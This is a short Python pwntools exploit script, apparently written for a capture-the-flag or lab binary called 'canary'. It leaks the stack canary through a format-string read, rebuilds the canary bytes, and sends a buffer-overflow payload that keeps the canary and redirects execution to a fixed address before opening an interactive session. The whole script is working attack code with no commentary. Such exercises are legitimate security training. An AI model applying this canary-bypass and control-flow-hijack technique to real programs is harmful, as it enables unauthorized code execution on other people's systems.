from pwn import * 

r = process('./canary')

string = "%15$08x"

r.sendline(string)

canary = r.recv()[:8]

canary = canary.decode("hex")[::-1]

print canary

payload = "a"*32 + canary + 3*4*"a" +p32(0x80484cb)

r.sendline(payload)

r.interactive()